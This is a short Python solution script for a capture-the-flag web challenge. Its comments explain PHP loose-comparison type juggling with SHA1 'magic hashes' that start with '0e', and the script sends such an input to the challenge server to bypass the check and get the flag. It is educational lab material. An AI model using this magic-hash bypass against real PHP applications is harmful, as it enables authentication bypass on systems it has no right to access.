import requests
import hashlib

# Get page:
page = requests.get('http://chall.csivit.com:30272')
print(page.text,'\n')
# We can see the PHP code being used to hide the flag.
# The code verifies the sha1 hash of the number given as input however it doesn't allow us to input that same number.

# Calculating its SHA1 hash:
print("SHA1 hash:\n"+hashlib.sha1("10932435112".encode()).hexdigest(),'\n')
# Luckily the hash starts with a 0e and does not use strict comparing which allows type juggling.
# It means that the hash can be considered a number in scientific notation (0 raised to something, i.e. 0) instead of a string.
# So we just need to give an input whose sha1 hash also starts with 0e. For eg: 'aaroZmOk'
# List of such inputs can be found here: https://github.com/JohnHammond/ctf-katana

r = requests.get('http://chall.csivit.com:30272?hash=aaroZmOk')
print(r.text)